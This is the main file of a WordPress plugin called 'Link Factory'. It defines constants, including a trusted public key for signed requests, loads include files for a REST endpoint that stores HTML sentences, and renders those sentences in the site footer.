<?php
/**
 * Plugin Name: Link Factory
 * Description: Homepage sentence publisher — exposes a REST endpoint that stores HTML sentences and renders them in wp_footer.
 * Version: 39d9bab
 * Author: Link Factory
 * License: GPL-2.0-or-later
 * Requires at least: 5.8
 * Requires PHP: 7.4
 *
 * @package LinkFactory
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define( 'LINK_FACTORY_VERSION', '39d9bab' );
define( 'LINK_FACTORY_PROTOCOL_VERSION', 2 );
define( 'LINK_FACTORY_TABLE', 'link_factory_sentences' );
define( 'LINK_FACTORY_NAMESPACE', 'link-factory/v1' );
define( 'LINK_FACTORY_SIGNATURE_TOLERANCE_SECONDS', 300 );
define( 'LINK_FACTORY_TRUSTED_PUBLIC_KEY', 'nJBIBuWPRNn+M1ijYSHXcglIiYDNA084+kqgHEtgFq0=' );

require_once __DIR__ . '/includes/class-repository.php';
require_once __DIR__ . '/includes/class-rest.php';
require_once __DIR__ . '/includes/class-footer.php';
require_once __DIR__ . '/includes/class-plugin.php';

register_activation_hook( __FILE__, array( 'LinkFactory\\Plugin', 'activate' ) );
add_action( 'plugins_loaded', array( 'LinkFactory\\Plugin', 'boot' ) );
